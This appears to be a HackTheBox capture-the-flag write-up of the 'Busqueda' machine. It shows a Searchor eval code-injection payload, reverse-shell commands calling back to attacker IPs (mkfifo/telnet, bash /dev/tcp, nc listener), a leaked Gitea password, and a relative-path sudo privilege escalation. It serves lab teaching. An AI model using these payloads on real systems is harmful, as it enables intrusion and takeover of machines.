@@ -1,0 +1,295 @@
+---
+title: Busqueda (HTB) / Easy
+image: /assets/writeups/6280b100e0a8fe2995c48c6446f87647.jpg
+description: Write-up of Busqueda Machine (Hackthebox * Hacker's Wrath) 
+date: 2023-05-01 09:00:00 -3000
+categories: [hackthebox]
+tags: [hackthebox, htb, writeup, easy, machine, linux, code-injection, path-manipulation]
+author: trace
+---
+
+## Machine Information
+
+---
+- Alias: Busqueda
+- Date: 1 May 2023
+- Platform: HackTheBox
+- OS: Linux
+- Difficulty: Easy
+- Tags: #htb #linux #code-injection #docker #gitea #relative-path-exploitation
+- Status: Active
+- IP: 10.10.11.208
+
+---
+
+## Resolution Summary
+
+1. Scanning for open ports, the attacker found a SSH and a HTTP service.
+2. In the HTTP, the hacker discovers that one of the dependencies (Searchor) is vulnerable to a code injection through eval.
+3. After crafting a payload, the attacker gain basic access in the web server.
+4. Harvesting for sensitive information, the attacker finds:
+	1. The password of the logged account (`~/.git/config`);
+	2. The account can run `system-checkup.py`
+	3. A gitea web service running in the machine (`/etc/hosts`) with two users: `cody` and `administrator`
+	5. The credentials of the `administrator` user on Gitea (via docker-inspect).
+	6. The source code of the `system-checkup.py`.
+5. Finally, the attacker abuses the script through a Relative Path vulnerability.
+
+## Tools
+
+| Purpose                         | Tools                                       |
+|:--------------------------------|:--------------------------------------------|
+| Port Scanning                   | [`nmap`](https://nmap.org/)                 |
+| Code Injection and Analysis     | [`python3`](https://www.python.org/)        |
+
+
+## Improved skills
+
+- Code Injection by source code analysis.
+- Docker structure and functionalities.
+- Gitea basics.
+- Relative path sudo exploitation.
+
+## Information Gathering
+
+#### Port Scanning
+
+Scanning the ports of the server: 
+
+```
+# Nmap 7.93 scan initiated Sun Apr  9 17:30:28 2023 as: nmap -sS -oN nmap.txt 10.10.11.208
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+```
+
+The SSH is the `OpenSSH_8.9p1`. That way, our entrypoint is in the HTTP service. 
+
+## Enumeration
+
+#### HTTP (Flask/searcher.htb)
+
+
+Acessing the web-page, we have:
+
+<img src="/assets/writeups/2023-05-01-busqueda/website.png" width=600px alt="Busqueda initial page">
+
+
+We can choose a search engine and perform a query. If we pay attention, there's a program named <b>Searchor</b> in the footer of the page.
+
+
+![Searchor version](/assets/writeups/2023-05-01-busqueda/searchor_version.png)]
+
+
+Searching about this program, we find that it's an [Open Source project](https://github.com/ArjunSharda/Searchor) hosted on Github. Upon examining the versions, we discover that prior to version 2.4.2, the project was vulnerable to [Code Injection](https://github.com/ArjunSharda/Searchor/pull/130/commits/29d5b1f28d29d6a282a5e860d456fab2df24a16b) due to the use of 'eval' in the search functionality.
+
+
+![Vulnerable eval](/assets/writeups/2023-05-01-busqueda/eval.png)
+
+
+This is the code that will allow us to gain access.
+
+## Exploitation
+
+Eval is a Python function that allows the execution of strings as code. However, there are some restrictions on its usage. One of them is that the expression inside cannot contain more than one line of code, even with the use of newline characters ('\n') or semicolons (';'). Another restriction is that native functions like 'import' must be called using the original [built-in syntax](https://docs.python.org/3/reference/import.html#the-import-system), such as:
+
+
+```python
+eval("__import__('os')")
+```
+
+
+If you want to know more about evals, check [here](https://medium.com/swlh/hacking-python-applications-5d4cd541b3f1).
+
+
+### Building the Payload
+
+
+We have two parameters under our control: `engine` and `query`. The `engine` parameter refers to the search engine being used, and it is a subclass of the Engine class. The `query` parameter represents the contents of our search. Let's utilize the `query` parameter for our search:
+
+
+```python
+url = eval(
+  f"Engine.Google.search('INJECTION_GOES_HERE', copy_url={copy}, open_web={open})"
+)
+```
+
+
+To construct the payload, we need to create a valid Python expression that executes any command of our choosing. Firstly, let's write a code snippet that uses 'curl' to retrieve a web page:
+
+
+```python
+__import__('os').system('curl https://10.10.14.88:8000/')
+```
+
+
+Now, we need to inject this code into the 'eval' expression. The simplest way to achieve this is by concatenating two strings: one empty string and the other being the result (status code) of the executed command:
+
+
+```python 
+url = eval(
+  f"Engine.Google.search('' + str(__import__('os').system('curl http://10.10.14.88:8000/'))) # ', copy_url={copy}, open_web={open})"
+)
+```
+
+
+That way, our malicious search will be executed on the server side:
+
+
+```python
+' + str(__import__('os').system('TF=$(mktemp -u);mkfifo $TF && telnet 10.10.14.88 4000 0<$TF | bash 1>$TF')))#
+```
+
+![Connection](/assets/writeups/2023-05-01-busqueda/malicious.png)
+
+## Privilege Escalation
+
+#### Local Enumeration (svc)
+
+We log in as the `svc` user. The user's flag is located in the home directory.
+
+
+As we begin searching the system, we come across some sensitive files. The first one is `/etc/hosts`, which provides information about a _gitea_ subdomain (gitea.searcher.htb).
+
+
+![Login Page of Gitea](/assets/writeups/2023-05-01-busqueda/gitea_login.png)
+
+
+The second one is located on the webpage directory: `.git/config`. This file contain the credentials of the cody user in _gitea_. 
+
+
+```bash
+$ cat config
+...
+[remote "origin"]
+	url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
+	fetch = +refs/heads/*:refs/remotes/origin/*
+```
+
+
+This is the password for the `svc` user too.
+
+
+#### Another user?
+
+
+Accessing the Gitea homepage, we discover that there's an `administrator` user who has contributed to the `Searcher_site` repository.
+
+
+![Administrator user contribution](/assets/writeups/2023-05-01-busqueda/cody_gitea.png)
+
+
+#### Our exit door: sudo.
+
+
+Checking the user permissions with `sudo -l`, we observe that the `system-checkup.py` script is available with root privileges.
+
+
+```bash
+User svc may run the following commands on busqueda:
+    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
+```
+
+
+Running it, we have:
+
+
+```
+$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py -h
+Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)
+
+     docker-ps     : List running docker containers
+     docker-inspect : Inpect a certain docker container
+     full-checkup  : Run a full system checkup
+```
+
+
+It is possible that the `system-checkup.py` script, under the hood, executes Docker commands. By comparing the behavior of the script to the [docker ps](https://docs.docker.com/engine/reference/commandline/ps/) command and conducting further investigation, we can confirm this theory:
+
+
+```
+$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
+CONTAINER ID   IMAGE                [...]   PORTS                                             NAMES
+960873171e2e   gitea/gitea:latest   [...]   127.0.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
+f84a6b33fb5a   mysql:8              [...]   127.0.0.1:3306->3306/tcp, 33060/tcp               mysql_db
+```
+
+
+There it is! The Gitea service runs via Docker on the machine. We can inspect it using the [docker inspect](https://docs.docker.com/engine/reference/commandline/inspect/#get-a-subsection-in-json-format) command. Within the container configuration, we discover a database password that matches the administrator's password as well!
+
+
+![Administrator password](/assets/writeups/2023-05-01-busqueda/docker_config.png)
+
+
+#### Source code. 
+
+
+Inside Gitea, we come across a repository called `scripts` which contains the `system-checkup.py` file.
+
+
+![Scripts repo](/assets/writeups/2023-05-01-busqueda/scripts.png)
+
+
+Checking the source code:
+
+
+```python
+import subprocess
+import sys
+
+actions = ['full-checkup', 'docker-ps','docker-inspect']
+
+def run_command(arg_list):
+    r = subprocess.run(arg_list, capture_output=True)
+    if r.stderr:
+        output = r.stderr.decode()
+    else:
+        output = r.stdout.decode()
+
+    return output
+
+# [...]
+
+if action == 'docker-inspect':
+  # [...]
+
+elif action == 'docker-ps':
+  # [...]
+
+elif action == 'full-checkup':
+  try:
+    arg_list = ['./full-checkup.sh']
+    print(run_command(arg_list))
+    print('[+] Done!')
+  except:
+    print('Something went wrong')
+    exit(1)
+```
+
+
+Here's our way out of here. In the `arg_list` variable (line 25), the script searches for a file with the path `./full-checkup.sh`, which is relative to the user's current execution location. By creating our own `full-checkup.sh` file (with malicious code), we can escalate privileges to root.
+
+
+```bash
+cd /tmp 
+vim full-checkup.sh 
+```
+
+Inside the file:
+
+
+```vim
+#!/bin/bash
+bash -i >& /dev/tcp/10.10.14.78/4444 0>&1
+```
+
+Finally, the icing on the cake is:
+
+
+```shell 
+(local) $ nc -lvp 4444
+$ chmod +x full-checkup.sh 
+$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
+# whoami
+root
+```
